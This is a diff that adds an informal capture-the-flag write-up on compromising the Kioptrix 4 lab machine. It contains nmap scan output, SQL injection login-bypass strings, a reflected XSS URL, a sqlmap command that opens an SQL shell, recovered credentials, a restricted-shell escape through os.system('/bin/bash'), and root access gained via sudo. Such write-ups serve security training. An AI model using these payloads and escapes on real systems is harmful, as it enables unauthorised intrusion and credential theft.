@@ -1,0 +1,150 @@
+Kioptrix_4:
+Time taken: ~ 2 hours
+
+Alrighty so first let's start with some recon:
+nmap -sS -sV -A -O -T5 212.83.142.83:
+	Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-26 15:55 MDT
+	Warning: 212.83.142.83 giving up on port because retransmission cap hit (2).
+	Nmap scan report for ctf06.root-me.org (212.83.142.83)
+	Host is up (0.11s latency).
+	Not shown: 995 closed ports
+	PORT    STATE    SERVICE     VERSION
+	22/tcp  open     ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+	| ssh-hostkey: 
+	|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
+	|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
+	25/tcp  filtered smtp
+	80/tcp  open     http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+	|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+	|_http-title: Site doesn't have a title (text/html).
+	139/tcp open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp open     netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
+	Device type: general purpose|printer
+	Running (JUST GUESSING): QEMU (96%), Konica Minolta embedded (87%), GNU Hurd (87%)
+	OS CPE: cpe:/a:qemu:qemu cpe:/h:konicaminolta:7035 cpe:/o:gnu:hurd
+	Aggressive OS guesses: QEMU user mode network gateway (96%), Konica Minolta 7035 printer (87%), GNU Hurd 0.3 (87%)
+	No exact OS matches for host (test conditions non-ideal).
+	Network Distance: 2 hops
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	Host script results:
+	|_clock-skew: mean: 5s, deviation: 0s, median: 5s
+	|_nbstat: NetBIOS name: CTF, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+	| smb-os-discovery: 
+	|   OS: Unix (Samba 3.0.28a)
+	|   Computer name: ctf06
+	|   NetBIOS computer name: 
+	|   Domain name: root-me.org
+	|   FQDN: ctf06.root-me.org
+	|_  System time: 2017-05-26T17:55:38-04:00
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+	TRACEROUTE (using port 80/tcp)
+	HOP RTT     ADDRESS
+	1   0.52 ms 10.0.2.2
+	2   0.67 ms ctf06.root-me.org (212.83.142.83)
+
+	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 30.23 seconds
+
+uniscan doesn't give us anything too useful, aside from the usernames:
+kevinh
+mike
+
+a lot of shit here. Let's try to exploit the web app to get ssh creds
+
+try the usual:
+
+	username: admin
+	password : ' or 1=1 --
+
+	Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
+
+so we're dealing with mysql. 
+
+BONUS: username param is vulnerable to XSS:
+http://ctf06.root-me.org/member.php?username=%3Cscript%3Ealert%28%22hi%20friend%22%29%3C/script%3E
+
+Anyway:
+
+fire up sqlmap:
+
+sqlmap -u 'http://cft06.root-me.org/checklogin.php' --data='POSTDATA=myusername=admin&mypassword=passwd&Submit=Login' --sql-shell:
+
+gives us a username and password!
+	john
+	MyNameIsJohn
+
+ALSO
+
+we can fux with the login to give us the same...
+
+POST data:
+username = john
+password = ' or 1=1 -- -
+cookie = use BurpSuite or Tamper Data to get a cookie
+
+gives us the same
+
+login to ssh with john@ctf06.root-me.org, password MyNameIsJohn
+
+Welcome to LigGoat Security Systems - We are Watching
+== Welcome LigGoat Employee ==
+LigGoat Shell is in place so you  don't screw up
+Type '?' or 'help' to get the list of allowed commands
+john:~$ ?
+cd  clear  echo  exit  help  ll  lpath  ls
+john:~$ uname -r
+*** unknown command: uname
+
+we're locked into a limited shell (lshell) with basically jack shit to work with...
+
+research shows that lshell is python based...maybe we can try to break free?
+
+john:~$ echo os.system('/bin/bash')
+john@ctf:~$ id
+uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
+
+YEAH BUDDY!
+
+alright now time to privec.
+
+uname -r and google to find a vulnerability.
+vulnerability can be loaded with wget + pastebin...
+
+BUT NO GCC. WTF
+
+alright, maybe we can try local privesc by adding a new user?
+
+john@ctf:/tmp$ sudo adduser --uid 116 foo
+Adding user `foo' ...
+Adding new group `foo' (116) ...
+Adding new user `foo' (116) with group `foo' ...
+Creating home directory `/home/foo' ...
+Copying files from `/etc/skel' ...
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+Changing the user information for foo
+Enter the new value, or press ENTER for the default
+	Full Name []: foo
+	Room Number []: 1337
+	Work Phone []: 1337
+	Home Phone []: 1337
+	Other []: 1337
+Is the information correct? [y/N] y
+john@ctf:/tmp$ id
+uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
+
+then sudo -i to log in as our new root user...
+
+john@ctf:/tmp$ sudo -i
+root@ctf:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+BOOM! that was fun
